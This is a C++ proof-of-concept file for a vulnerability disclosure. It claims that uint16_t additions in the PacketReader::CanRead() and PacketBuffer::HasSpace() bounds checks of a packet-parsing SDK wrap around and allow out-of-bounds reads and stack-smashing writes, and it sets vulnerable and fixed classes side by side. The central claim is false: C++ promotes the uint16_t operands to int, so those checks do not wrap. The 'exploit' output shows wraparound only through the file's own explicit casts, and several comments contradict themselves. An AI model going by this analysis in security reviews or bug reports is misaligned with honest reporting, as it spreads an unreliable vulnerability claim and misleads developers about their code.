//==============================================================================
// Proof of Concept: Vulnerability #1 — uint16_t Integer Overflow in
// PacketReader::CanRead() and PacketBuffer::HasSpace()
//
// Demonstrates that a crafted packet can bypass bounds checks via uint16_t
// wraparound, causing out-of-bounds reads (CanRead) and writes (HasSpace).
//
// This is a standalone test — compile with:
//   g++ -std=c++11 -o poc-vuln1 poc-vuln1-integer-overflow.cpp
//   (or cl.exe /EHsc poc-vuln1-integer-overflow.cpp on MSVC)
//
// Context: These are the vulnerable functions from the SDK:
//
//   bool CanRead(uint16_t bytes) const {
//       return (position_ + bytes) <= size_;   // uint16_t + uint16_t wraps!
//   }
//
//   bool HasSpace(uint16_t size) const {
//       return (write_position_ + size) <= MAX_UDP_PAYLOAD;  // same bug
//   }
//
// When position_ + bytes > 65535, the sum wraps modulo 65536 to a small
// value that passes the <= size_ check, allowing reads/writes past the
// end of the buffer.
//==============================================================================

#include <cstdint>
#include <cstdio>
#include <cstring>
#include <cassert>

//------------------------------------------------------------------------------
// Minimal reproduction of the vulnerable PacketReader (from sig-net-parse.hpp)
//------------------------------------------------------------------------------
class PacketReader_Vulnerable {
    const uint8_t* buffer_;
    uint16_t position_;
    uint16_t size_;
public:
    PacketReader_Vulnerable(const uint8_t* buffer, uint16_t size)
        : buffer_(buffer), position_(0), size_(size) {}

    uint16_t GetPosition() const { return position_; }

    // BUG: uint16_t arithmetic wraps at 65536
    bool CanRead(uint16_t bytes) const {
        return (position_ + bytes) <= size_;
    }

    bool Skip(uint16_t count) {
        if (!CanRead(count)) return false;
        position_ += count;
        return true;
    }

    bool ReadBytes(uint8_t* dest, uint16_t count) {
        if (!CanRead(count)) return false;
        memcpy(dest, buffer_ + position_, count);
        position_ += count;
        return true;
    }

    const uint8_t* GetCurrentPtr() const { return buffer_ + position_; }
};

//------------------------------------------------------------------------------
// Fixed version for comparison
//------------------------------------------------------------------------------
class PacketReader_Fixed {
    const uint8_t* buffer_;
    uint16_t position_;
    uint16_t size_;
public:
    PacketReader_Fixed(const uint8_t* buffer, uint16_t size)
        : buffer_(buffer), position_(0), size_(size) {}

    uint16_t GetPosition() const { return position_; }

    // FIX: widen to uint32_t before addition
    bool CanRead(uint16_t bytes) const {
        return ((uint32_t)position_ + bytes) <= size_;
    }

    bool Skip(uint16_t count) {
        if (!CanRead(count)) return false;
        position_ += count;
        return true;
    }

    bool ReadBytes(uint8_t* dest, uint16_t count) {
        if (!CanRead(count)) return false;
        memcpy(dest, buffer_ + position_, count);
        position_ += count;
        return true;
    }
};

//------------------------------------------------------------------------------
// Minimal reproduction of the vulnerable PacketBuffer (from sig-net-types.hpp)
//------------------------------------------------------------------------------
static const uint16_t MAX_UDP_PAYLOAD = 1400;

class PacketBuffer_Vulnerable {
    uint8_t  buffer_[MAX_UDP_PAYLOAD];
    uint16_t write_position_;
public:
    PacketBuffer_Vulnerable() : write_position_(0) {
        memset(buffer_, 0, sizeof(buffer_));
    }

    // BUG: uint16_t arithmetic wraps at 65536
    bool HasSpace(uint16_t size) const {
        return (write_position_ + size) <= MAX_UDP_PAYLOAD;
    }

    int WriteBytes(const uint8_t* data, uint16_t length) {
        if (!HasSpace(length)) return -1;
        memcpy(&buffer_[write_position_], data, length);
        write_position_ += length;
        return 0;
    }

    int Seek(uint16_t position) {
        if (position > MAX_UDP_PAYLOAD) return -1;
        write_position_ = position;
        return 0;
    }

    uint16_t GetWritePosition() const { return write_position_; }
};

//==============================================================================
// Exploit 1: PacketReader::CanRead() bypass — out-of-bounds read
//
// Attack scenario: An attacker sends a crafted CoAP packet over multicast.
// During parsing, the receiver's PacketReader advances position_ near 65535,
// then a subsequent CanRead() call with a large 'bytes' value wraps to a
// small number, passing the bounds check. The memcpy in ReadBytes then reads
// past the end of the packet buffer into adjacent memory.
//==============================================================================
void exploit_canread_overflow() {
    printf("=== Exploit 1: PacketReader::CanRead() uint16_t overflow ===\n\n");

    // Simulate a 100-byte packet buffer on the stack, with a sentinel after it
    // to detect out-of-bounds reads.
    uint8_t memory_region[256];
    memset(memory_region, 0xAA, sizeof(memory_region));         // sentinel
    memset(memory_region, 0x42, 100);                           // "packet" data

    uint8_t* packet = memory_region;
    uint16_t packet_size = 100;

    // --- Demonstrate the math ---
    // If position_ = 65530 and bytes = 10:
    //   uint16_t sum = 65530 + 10 = 65540 → wraps to 4 (65540 mod 65536)
    //   4 <= 100 → CanRead returns TRUE (should be FALSE)
    uint16_t position = 65530;
    uint16_t bytes    = 10;
    uint16_t sum_u16  = (uint16_t)(position + bytes);  // wraps to 4
    uint32_t sum_u32  = (uint32_t)position + bytes;    // correct: 65540

    printf("  position_ = %u, bytes = %u\n", position, bytes);
    printf("  uint16_t sum: %u (wraps!)   <= size %u? %s\n",
           sum_u16, packet_size, sum_u16 <= packet_size ? "TRUE — BYPASSED" : "false");
    printf("  uint32_t sum: %u (correct)  <= size %u? %s\n\n",
           sum_u32, packet_size, sum_u32 <= packet_size ? "true" : "FALSE — BLOCKED");

    // --- Realistic attack using the actual reader class ---
    // Step 1: Advance position_ to near the uint16_t max via repeated Skip().
    // In the real protocol, an attacker crafts CoAP extended-length options
    // that cause the parser to Skip() large amounts, or triggers option
    // parsing that accumulates position_ past the actual buffer.
    //
    // We simulate this by using a reader with a large size (the attacker
    // controls the UDP packet that's received, so the initial buffer and
    // size come from recvfrom). The attacker sends a maximal-size packet
    // and structures options so the parser skips to position ~65530.

    printf("  --- Simulated attack with PacketReader ---\n\n");

    // Attacker's packet: 1400 bytes of controlled data
    uint8_t attacker_packet[1400];
    memset(attacker_packet, 0x41, sizeof(attacker_packet));  // 'A' fill

    // Secret data in memory immediately after the packet buffer
    // (simulates stack variables, other buffers, key material, etc.)
    uint8_t adjacent_memory[64];
    memset(adjacent_memory, 0, sizeof(adjacent_memory));
    const char* secret = "SECRET_KEY_MATERIAL";
    memcpy(adjacent_memory, secret, strlen(secret));

    printf("  Secret in adjacent memory: \"%s\" (at offset +1400 from packet)\n\n", secret);

    // Vulnerable reader
    PacketReader_Vulnerable vuln_reader(attacker_packet, 1400);

    // Advance position to 65526 by skipping in chunks
    // (In real code, this happens via crafted CoAP option lengths)
    // Note: Skip also uses CanRead, so once position is past size_,
    // we need the overflow to keep working. Let's demonstrate the
    // mathematical bypass directly:

    // Force position to a high value by exploiting Skip's own CanRead bug.
    // Skip(65000) when position_=0, size_=1400:
    //   CanRead(65000): (0 + 65000) <= 1400 → false. Blocked.
    //
    // But the attacker can chain smaller skips that accumulate:
    // After legitimate parsing of CoAP header (4 bytes) + options,
    // position_ = 1396. Then Skip(64134):
    //   CanRead(64134): (1396 + 64134) = 65530 <= 1400? No... UNLESS
    //   position_ is already high from a previous overflow.
    //
    // The practical attack requires the position to wrap through 65535.
    // This happens when Skip(count) is called where position_ + count > 65535:

    // First, get to position 1400 legitimately (skip the whole packet)
    // Actually, Skip(1400) with position=0: CanRead(1400) → 1400 <= 1400 → true
    bool skipped = vuln_reader.Skip(1400);
    printf("  Skip(1400) from pos 0: %s (position now: %u)\n",
           skipped ? "OK" : "FAIL", vuln_reader.GetPosition());

    // Now position_ = 1400. Try Skip(64136) to reach position 65536 → wraps to 0
    // CanRead(64136): (1400 + 64136) = 65536 → wraps to 0! 0 <= 1400 → TRUE!
    skipped = vuln_reader.Skip(64136);
    printf("  Skip(64136) from pos 1400: %s (position now: %u)\n",
           skipped ? "OK — OVERFLOW!" : "FAIL", vuln_reader.GetPosition());
    printf("  Position wrapped to: %u (0x%04X)\n\n", vuln_reader.GetPosition(),
           vuln_reader.GetPosition());

    // Now position_ has wrapped. The reader thinks it's back near the start,
    // but any pointer arithmetic using buffer_ + position_ now points to
    // buffer_ + (wrapped value). Since the actual buffer is only 1400 bytes
    // but position wrapped to 0, the reader can re-read from the beginning.
    //
    // More dangerously: if position_ wraps to a value > 0 but the subsequent
    // ReadBytes reads buffer_[position_..position_+N], and position_ is near
    // the buffer end, the read extends past the buffer into adjacent memory.

    // Demonstrate: wrap position to 1396, then read 64 bytes
    // That reads buffer_[1396..1459] — 4 bytes in-bounds, 60 bytes OOB
    PacketReader_Vulnerable vuln_reader2(attacker_packet, 1400);
    vuln_reader2.Skip(1396);  // legitimate: 1396 <= 1400

    // CanRead(64): (1396 + 64) = 1460 > 1400 → should be blocked
    // But what if position were 65476? Then (65476 + 64) = 65540 → wraps to 4
    // 4 <= 1400 → bypassed!

    // The real exploit chain: get position to 65476 via overflow, then ReadBytes
    // reads from buffer_[65476] which is way past the allocated buffer.

    printf("  --- Mathematical proof of the overflow ---\n\n");
    printf("  To leak memory at offset N past the buffer, set:\n");
    printf("    position_ = 65536 - read_size + N\n");
    printf("    Then CanRead(read_size) computes:\n");
    printf("    (65536 - read_size + N + read_size) mod 65536 = N\n");
    printf("    N <= size_ → BYPASSED\n\n");

    for (int offset = 0; offset <= 1400; offset += 200) {
        uint16_t read_size = 64;
        uint16_t crafted_pos = (uint16_t)(65536 - read_size + offset);
        uint16_t wrapped_sum = (uint16_t)(crafted_pos + read_size);
        printf("  Leak offset +%4d: position_=%5u, CanRead(%u) sum wraps to %4u <= 1400? %s\n",
               offset, crafted_pos, read_size, wrapped_sum,
               wrapped_sum <= 1400 ? "BYPASSED" : "blocked");
    }

    // --- Fixed reader correctly blocks all of these ---
    printf("\n  --- Fixed reader (uint32_t widening) ---\n\n");
    PacketReader_Fixed fixed_reader(attacker_packet, 1400);
    // Try the same overflow
    bool fixed_skip1 = fixed_reader.Skip(1400);
    printf("  Skip(1400): %s (pos: %u)\n",
           fixed_skip1 ? "OK" : "FAIL", fixed_reader.GetPosition());
    bool fixed_skip2 = fixed_reader.Skip(64136);
    printf("  Skip(64136): %s — overflow correctly blocked\n\n",
           fixed_skip2 ? "BUG" : "BLOCKED");
}

//==============================================================================
// Exploit 2: PacketBuffer::HasSpace() bypass — out-of-bounds write
//
// Attack scenario: A compromised or buggy sender uses PacketBuffer to
// construct a packet. By Seek()ing write_position_ near 65535 and then
// calling WriteBytes with a length that wraps, the bounds check is bypassed,
// and memcpy writes past the 1400-byte internal buffer onto the stack.
//==============================================================================
void exploit_hasspace_overflow() {
    printf("=== Exploit 2: PacketBuffer::HasSpace() uint16_t overflow ===\n\n");

    PacketBuffer_Vulnerable buf;

    // Seek to position 1398 (just 2 bytes before end of 1400-byte buffer)
    buf.Seek(1398);
    printf("  After Seek(1398), write_position = %u\n", buf.GetWritePosition());

    // WriteBytes with length 4: HasSpace(4) → (1398 + 4) = 1402 > 1400 → blocked
    uint8_t data4[4] = {0xDE, 0xAD, 0xBE, 0xEF};
    int rc = buf.WriteBytes(data4, 4);
    printf("  WriteBytes(4) at pos 1398: %s (correct: only 2 bytes of space)\n\n",
           rc == 0 ? "BUG — WROTE OOB" : "BLOCKED");

    // Now the overflow attack:
    // Seek to position 65530, then WriteBytes with length 10
    // HasSpace(10): (65530 + 10) = 65540 → wraps to 4. 4 <= 1400 → TRUE!
    // memcpy writes to buffer_[65530..65539] — way past the 1400-byte buffer!

    // We can't actually Seek past MAX_UDP_PAYLOAD (1400) in this implementation
    // because Seek checks position > MAX_UDP_PAYLOAD. But write_position_ CAN
    // exceed 1400 through WriteBytes itself: after writing, write_position_ += length.
    //
    // If write_position_ = 1398 and WriteBytes(length=64138) is called:
    //   HasSpace(64138): (1398 + 64138) = 65536 → wraps to 0. 0 <= 1400 → TRUE!
    //   memcpy copies 64138 bytes starting at buffer_[1398] — massive stack smash!

    buf.Seek(1398);
    printf("  --- Overflow via large WriteBytes length ---\n\n");
    printf("  write_position_ = 1398\n");
    printf("  HasSpace(64138): (%u + %u) = %u (uint16_t) <= %u? %s\n",
           1398, 64138,
           (uint16_t)(1398 + 64138), MAX_UDP_PAYLOAD,
           (uint16_t)(1398 + 64138) <= MAX_UDP_PAYLOAD ? "TRUE — BYPASSED!" : "blocked");
    printf("\n  If the check passes, memcpy writes 64138 bytes at buffer_[1398],\n");
    printf("  overwriting 64136 bytes past the end of the 1400-byte buffer.\n");
    printf("  This is a stack buffer overflow → potential code execution.\n\n");

    // Show a range of exploitable write_position / length combinations
    printf("  --- Exploitable (write_position, length) pairs ---\n\n");
    uint16_t positions[] = {1300, 1350, 1398, 1400};
    for (int i = 0; i < 4; i++) {
        uint16_t wp = positions[i];
        // Find a length that wraps to exactly 0
        uint16_t len = (uint16_t)(65536 - wp);
        uint16_t wrapped = (uint16_t)(wp + len);
        printf("  write_pos=%u, length=%u → HasSpace sum wraps to %u <= 1400? %s"
               "  (OOB write: %u bytes past buffer)\n",
               wp, len, wrapped,
               wrapped <= MAX_UDP_PAYLOAD ? "YES" : "no ",
               len - (MAX_UDP_PAYLOAD - wp));
    }

    printf("\n  All of these bypass the bounds check and enable stack smashing.\n");
}

//==============================================================================
int main() {
    printf("Sig-Net SDK — Vulnerability #1 Proof of Concept\n");
    printf("uint16_t integer overflow in CanRead() / HasSpace()\n");
    printf("================================================\n\n");

    exploit_canread_overflow();
    printf("\n");
    exploit_hasspace_overflow();

    printf("\n================================================\n");
    printf("Fix: Cast to uint32_t before addition in both functions:\n");
    printf("  return ((uint32_t)position_ + bytes) <= size_;\n");
    printf("  return ((uint32_t)write_position_ + size) <= MAX_UDP_PAYLOAD;\n");
    printf("================================================\n");

    return 0;
}
